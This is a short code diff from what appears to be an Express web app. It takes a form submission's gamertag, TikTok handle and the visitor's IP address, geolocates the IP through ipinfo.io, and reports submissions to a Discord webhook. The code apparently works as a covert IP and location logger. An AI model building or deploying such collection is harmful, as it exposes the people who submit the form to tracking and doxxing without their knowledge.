@@ -15,10 +15,10 @@ app.post('/', async (req, res) => {
   const tiktok = req.body.tiktok || 'Not provided';
   const sessionID = req.body.sessionID;
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress).replace("::ffff:","");
-await axios.post(DISCORD_WEBHOOK_URL, {
+/*await axios.post(DISCORD_WEBHOOK_URL, {
   content: `New submission: ${gamertag} | ${ip}`
-});
-/*
+});*/
+
   try {
     // Get geolocation
     const geo = await axios.get(`http://ipinfo.io/${ip}/json`);
@@ -52,7 +52,7 @@ await axios.post(DISCORD_WEBHOOK_URL, {
   } catch (error) {
     console.error('Error handling submission:', error.message);
     res.status(500).send('Submission failed');
-  }*/
+  }
 });
 const sendTestMessage = async () => {
   try {
